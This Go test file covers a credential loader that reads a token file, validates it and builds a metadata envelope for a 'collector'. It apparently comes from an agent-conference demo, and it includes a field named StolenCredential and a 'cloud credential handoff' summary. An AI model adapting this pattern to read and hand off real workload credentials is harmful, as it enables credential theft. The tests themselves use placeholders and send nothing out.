package credential

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func writeCred(t *testing.T, content string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "credential")
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func fixed(cfg Config) *Loader {
	cfg.now = func() time.Time { return time.Date(2024, 1, 2, 3, 4, 5, 0, time.UTC) }
	cfg.randHex = func() (string, error) { return "deadbeef", nil }
	return New(cfg)
}

func TestReadCredential_Verbatim(t *testing.T) {
	token := "aaa.bbb.ccc"
	l := fixed(Config{CredentialPath: writeCred(t, token+"\n")})
	cred, err := l.ReadCredential()
	if err != nil {
		t.Fatalf("ReadCredential: %v", err)
	}
	if cred != token {
		t.Errorf("credential = %q, want %q (verbatim, trailing newline trimmed)", cred, token)
	}
	// The body envelope must carry metadata but NOT the credential.
	out, err := l.BuildEnvelope()
	if err != nil {
		t.Fatalf("BuildEnvelope: %v", err)
	}
	var env Envelope
	if err := json.Unmarshal(out, &env); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if env.StolenCredential != "" {
		t.Errorf("body must not carry the credential; got %q", env.StolenCredential)
	}
	if env.Tool != ToolName || env.Schema != SchemaVersion {
		t.Errorf("tool/schema = %q/%q", env.Tool, env.Schema)
	}
	if env.RequestID != "deadbeef" {
		t.Errorf("request_id = %q", env.RequestID)
	}
	// Defaults must satisfy the collector's required, pattern-validated fields.
	if env.ClusterID == "" || env.Namespace == "" || env.Pod == "" {
		t.Errorf("missing required collector fields: %+v", env)
	}
}

func TestBuildEnvelope_MetadataOverrides(t *testing.T) {
	l := fixed(Config{
		CredentialPath: writeCred(t, "token"),
		ClusterID:      "agentcon-japan-demo",
		Namespace:      "agentcon-demo",
		Pod:            "agentcon-agent-abc123",
		Summary:        "cloud credential handoff",
	})
	out, err := l.BuildEnvelope()
	if err != nil {
		t.Fatalf("BuildEnvelope: %v", err)
	}
	var env Envelope
	if err := json.Unmarshal(out, &env); err != nil {
		t.Fatal(err)
	}
	if env.Namespace != "agentcon-demo" || env.Pod != "agentcon-agent-abc123" {
		t.Errorf("metadata not applied: %+v", env)
	}
}

func TestReadCredential_EmptyRejected(t *testing.T) {
	l := fixed(Config{CredentialPath: writeCred(t, "   \n\t ")})
	if _, err := l.ReadCredential(); err == nil || !strings.Contains(err.Error(), "empty") {
		t.Fatalf("expected empty-credential error, got %v", err)
	}
}

func TestReadCredential_MissingPathRejected(t *testing.T) {
	l := fixed(Config{CredentialPath: ""})
	if _, err := l.ReadCredential(); err == nil {
		t.Fatal("expected error for empty credential path")
	}
}

func TestReadCredential_OverSizeRejected(t *testing.T) {
	big := strings.Repeat("a", MaxCredentialBytes+1)
	l := fixed(Config{CredentialPath: writeCred(t, big)})
	if _, err := l.ReadCredential(); err == nil || !strings.Contains(err.Error(), "cap") {
		t.Fatalf("expected size-cap error, got %v", err)
	}
}

func TestBuildEnvelope_MetadataBoundedAndControlStripped(t *testing.T) {
	l := fixed(Config{
		CredentialPath: writeCred(t, "token"),
		Summary:        "line1\nline2\x00tail",
	})
	out, err := l.BuildEnvelope()
	if err != nil {
		t.Fatal(err)
	}
	var env Envelope
	if err := json.Unmarshal(out, &env); err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(env.Summary, "\n\x00") {
		t.Errorf("summary retained control characters: %q", env.Summary)
	}
}

func TestClassify(t *testing.T) {
	dir := t.TempDir()
	write := func(name, content string) string {
		p := filepath.Join(dir, name)
		if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}
	cases := []struct{ name, content, want string }{
		{"placeholder", "AKSH-CUSTODY-PLACEHOLDER-not-a-real-credential", "placeholder"},
		{"placeholder_nl", "AKSH-CUSTODY-PLACEHOLDER-not-a-real-credential\n", "placeholder"},
		{"jwt", "aaa.bbb.ccc", "jwt"},
		{"empty", "   \n", "empty"},
		{"other", "just-a-string", "other"},
		{"two_segment", "aa.bb", "other"},
	}
	for _, c := range cases {
		if got := Classify(write(c.name, c.content)); got != c.want {
			t.Errorf("Classify(%s) = %q, want %q", c.name, got, c.want)
		}
	}
	if got := Classify(filepath.Join(dir, "absent")); got != "missing" {
		t.Errorf("Classify(absent) = %q, want missing", got)
	}
	if got := Classify(""); got != "missing" {
		t.Errorf("Classify(empty path) = %q, want missing", got)
	}
}
